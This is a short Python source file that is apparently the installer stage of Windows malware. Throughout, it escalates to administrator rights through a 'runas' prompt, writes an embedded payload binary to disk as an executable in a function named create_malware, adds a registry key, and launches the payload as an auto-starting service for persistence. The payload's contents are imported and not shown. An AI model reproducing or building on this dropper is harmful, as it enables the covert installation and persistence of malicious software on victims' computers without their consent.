from local_libs import payload
from local_libs.winregistry import Registry
from local_libs.env_vars import *

from pathlib import Path
import ctypes
import sys
import os


def development_logging():
    log = open("logging.log", "a")
    sys.stderr = log


def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)


def create_malware(path, binary_code):
    with open(path, "wb") as f:
        f.write(binary_code)


def setup_folder():
    # filename = PAYLOAD_FILENAME
    # new_path = MALWARE_PATH
    # new_binary_path = f"{new_path}\\{filename}.exe"
    new_binary_path = f"{MALWARE_PATH}{PAYLOAD_FILENAME}.exe"

    if not os.path.exists(MALWARE_PATH):
        Path(MALWARE_PATH).mkdir(0o777, True, True)
        create_malware(new_binary_path, payload.payload())

    return new_binary_path


def setup_registry():
    Registry.create_key(REG_KEY)


def start_malware(path):
    os.system(f"{path} --startup=auto install")
    os.system(f"{path} start")


def main():
    development_logging()

    if is_admin() == 0:
        run_as_admin()

    malware_path = setup_folder()
    setup_registry()

    start_malware(malware_path)


if __name__ == "__main__":
    main()
